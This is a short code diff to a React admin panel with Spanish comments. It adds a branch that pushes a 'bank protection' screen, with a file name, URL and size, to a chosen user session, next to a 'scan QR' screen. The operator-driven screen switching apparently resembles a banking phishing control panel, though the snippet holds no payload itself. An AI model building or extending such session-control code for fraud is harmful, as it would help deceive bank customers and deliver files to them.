@@ -496,6 +496,20 @@ export default function AdminPanel() {
       // No necesitamos un modal, simplemente enviamos la pantalla
     }
     
+    // Para proteccion_bancaria, enviamos con información del archivo si existe
+    if (screen === "proteccion_bancaria") {
+      const selectedSession = sessions.find(s => s.sessionId === selectedSessionId);
+      console.log("Enviando pantalla de protección bancaria");
+      sendScreenChange({
+        tipo: `mostrar_${screen}`,
+        sessionId: selectedSessionId,
+        fileName: selectedSession?.fileName,
+        fileUrl: selectedSession?.fileUrl,
+        fileSize: selectedSession?.fileSize
+      });
+      return;
+    }
+    
     // Para escanear_qr, enviamos directamente sin modal
     console.log("Enviando tipo de pantalla:", screen);
 
